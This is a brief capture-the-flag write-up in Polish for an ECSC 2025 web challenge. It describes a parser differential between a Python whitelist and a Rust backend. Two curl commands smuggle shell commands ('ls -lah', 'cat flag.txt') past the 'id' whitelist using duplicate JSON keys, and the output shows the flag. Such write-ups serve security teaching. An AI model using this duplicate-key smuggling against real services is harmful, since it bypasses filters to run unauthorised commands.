# Yet Another WAF - re - web

### Vulnerability

Parser Differential

### Solution

Backend w Rustcie handluje inaczej pola w obiekcie z taką samą nazwą (bierze pierwszy occurance), natomiast backend w Pythonie bierze ostatni, powodując to że Python czyta komendę `id`, która jest zwhitelistowana, a Rust czyta i wykonuje tą pierwszą:

```shell
$ curl "https://yaw.ecsc25.hack.cert.pl/run" -X POST --json '{"cmd": "ls -lah", "cmd": "id"}'
"total 76K\ndrwxr-xr-x 1 root root 4.0K Jul  1 18:43 .\ndrwxr-xr-x 1 root root 4.0K Jul  1 18:44 ..\n-rw-r--r-- 1 root root 1.1K Jul  1 18:44 .rustc_info.json\n-rw-r--r-- 1 root root  46K Jul  1 18:43 Cargo.lock\n-rw-r--r-- 1 root root  174 Jul  1 18:10 Cargo.toml\n-rw-r--r-- 1 root root   47 Jul  1 18:10 flag.txt\ndrwxr-xr-x 7 root root 4.0K Jul  1 18:44 release\ndrwxr-xr-x 2 root root 4.0K Jul  1 18:43 src\n"⏎

$ curl "https://yaw.ecsc25.hack.cert.pl/run" -X POST --json '{"cmd": "cat flag.txt", "cmd": "id"}'
"ecsc25{names_within_an_object_SHOULD_be_unique}"
```
